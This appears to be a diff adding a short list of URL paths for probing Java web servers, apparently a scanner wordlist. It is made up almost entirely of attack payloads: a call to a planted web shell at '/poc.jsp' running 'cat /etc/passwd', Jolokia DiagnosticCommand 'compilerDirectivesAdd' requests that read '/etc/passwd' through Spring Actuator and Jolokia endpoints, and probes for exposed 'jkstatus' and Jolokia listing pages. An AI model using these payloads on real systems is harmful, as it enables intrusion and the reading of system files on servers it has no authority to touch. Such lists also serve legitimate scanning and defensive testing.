@@ -1,0 +1,9 @@
+/poc.jsp/
+/poc.jsp?cmd=cat+%2Fetc%2Fpasswd
+/jkstatus
+/jkstatus;
+/index.jsp
+/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+/jolokia/list
+/actuator/jolokia/list
